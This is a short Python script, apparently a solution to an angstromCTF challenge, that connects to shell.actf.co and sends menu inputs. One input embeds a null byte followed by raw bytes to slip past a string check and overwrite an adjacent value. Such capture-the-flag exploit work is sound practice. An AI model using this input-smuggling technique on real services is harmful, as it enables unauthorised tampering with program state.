import socket
import time


def flush(sock):
    time.sleep(0.1)
    return sock.recv(2048)


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("shell.actf.co", 21300))

    flush(sock).decode()
    sock.send(b"1\n")

    flush(sock).decode()
    sock.send(b"yes\x00\x39\x05\x00\x00\n")

    flush(sock).decode()
    sock.send(b"yes\n")

    flush(sock).decode()
    sock.send(b"\n")

    flush(sock).decode()
    sock.send(b"\n")

    flush(sock).decode()
    sock.send(b"2\n")

    print(flush(sock).decode())
